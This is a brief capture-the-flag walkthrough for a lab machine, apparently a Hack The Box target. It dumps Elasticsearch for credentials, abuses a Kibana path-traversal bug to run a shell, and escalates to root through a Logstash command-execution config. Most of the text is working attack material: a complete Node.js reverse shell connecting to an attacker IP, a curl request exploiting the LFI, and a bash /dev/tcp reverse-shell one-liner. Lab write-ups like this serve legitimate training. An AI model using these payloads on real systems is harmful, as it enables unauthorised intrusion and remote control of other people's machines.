>>10.10.10.115:9200?_search >>> indexes: Bank, .Kibana , quotes >> Use ElasticDump to dump the database
>> get user credentials from Quotes

##SHELL AS SECURITY##
>> Kibana is running with priviliges so we can get kibana shell with LFI 
>> Javascript reverse shell in /tmp/shell.js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "10.10.15.128 ", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();

>>By reading /etc/kibana/kibana we see that Kibana runs on local host so we will call our shell as kibana with (LFI) bug 
curl -X GET '127.0.0.1:5601/api/console/api_server?&sense_version=%40%40SENSE_VERSION&apis=../../../../../../../tmp/a1.js'


##SHELL AS KIBANA##
>> lets see whats running as root: "ps -elf | grep root"
>> logstash is running as root
>> cd /etc/logstash/conf.d >> filter.conf , input.conf , output.cof
>> cat the 3 files and read configuration 
>> We see from input that files in "/opt/kibana" conatins commands that are executed every specific time, 
and from format we should make our root shell in specific format and place it in "opt/kibana":

Ejecutar comando : bash -i >& /dev/tcp/10.10.15.128/333 0>&1

>>Wait some time and you are Root :D

flag:3f5f727c***********
